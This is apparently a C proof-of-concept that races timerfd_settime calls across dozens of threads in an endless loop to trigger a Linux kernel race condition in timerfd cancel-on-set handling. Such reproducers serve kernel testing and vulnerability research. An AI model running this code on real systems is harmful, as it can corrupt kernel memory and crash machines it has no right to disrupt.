#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/timerfd.h>

int timer_fd = 0;
#define THREADS_CNT 0x20
#define THREAD_ROUND 0x20

void *threadA(void *argv)
{
    struct itimerspec new_value;
    struct timespec now;
    // int ret = 0;

    // errno = 0;
    clock_gettime(CLOCK_REALTIME, &now);
    // printf("    [+] threadA clock_gettime ret=%d errno=%d %s\n", ret, errno, strerror(errno));

    new_value.it_value.tv_sec = now.tv_sec + 0x10;
    new_value.it_value.tv_nsec = now.tv_nsec;
    new_value.it_interval.tv_sec = 0;
    new_value.it_interval.tv_nsec = 0;

    for (int i = 0; i < THREAD_ROUND; i++)
    {
        // errno = 0;
        timerfd_settime(timer_fd, TFD_TIMER_ABSTIME | TFD_TIMER_CANCEL_ON_SET, &new_value, NULL);
        // printf("    [+] threadA timerfd_settime fd=%d ret=%d errno=%d %s\n", timer_fd, ret, errno, strerror(errno));
        usleep(1000);
    }

    // printf("    [+] threadA finish!!!\n\n\n");
}

void *threadB(void *argv)
{
    struct itimerspec new_value;
    struct timespec now;
    // int ret = 0;

    // errno = 0;
    clock_gettime(CLOCK_REALTIME_COARSE, &now);
    // printf("    [+] threadB clock_gettime ret=%d errno=%d %s\n", ret, errno, strerror(errno));

    new_value.it_value.tv_sec = now.tv_sec + 0x16;
    new_value.it_value.tv_nsec = now.tv_nsec;
    new_value.it_interval.tv_sec = 0;
    new_value.it_interval.tv_nsec = 0;

    for (int i = 0; i < THREAD_ROUND; i++)
    {
        // errno = 0;
        timerfd_settime(timer_fd, TFD_TIMER_ABSTIME, &new_value, NULL);
        // printf("    [+] threadB timerfd_settime fd=%d ret=%d errno=%d %s\n", timer_fd, ret, errno, strerror(errno));
        usleep(1000);
    }

    // close(timer_fd);
    // printf("    [+] threadB finish!!!\n\n\n");
}

void *threadC(void *argv)
{
    pthread_t thread1[THREADS_CNT] = {0};
    pthread_t thread2[THREADS_CNT] = {0};

    int round = 0;

    for (;;)
    {
        printf("[+] round=%d\n", round);
        errno = 0;
        timer_fd = timerfd_create(CLOCK_REALTIME, 0);
        // printf("[+] timer_fd=%d errno=%d %s\n", timer_fd, errno, strerror(errno));

        for (int i = 0; i < THREADS_CNT; i++)
        {
            pthread_create(&thread1[i], 0, threadA, NULL);
            pthread_create(&thread2[i], 0, threadB, NULL);
        }

        for (int i = 0; i < THREADS_CNT; i++)
        {
            pthread_join(thread1[i], NULL);
            pthread_join(thread2[i], NULL);
        }

        // close(timer_fd);
        // sleep(1);
        round++;
    }

    // printf("    [+] threadC close finish!!!\n\n\n");
}

int main(int argc, char **argv)
{
    pthread_t thread3;

start:
    pthread_create(&thread3, 0, threadC, NULL);
    pthread_join(thread3, NULL);

    printf("[+] again!!!\n\n\n");
    goto start;

    return 0;
}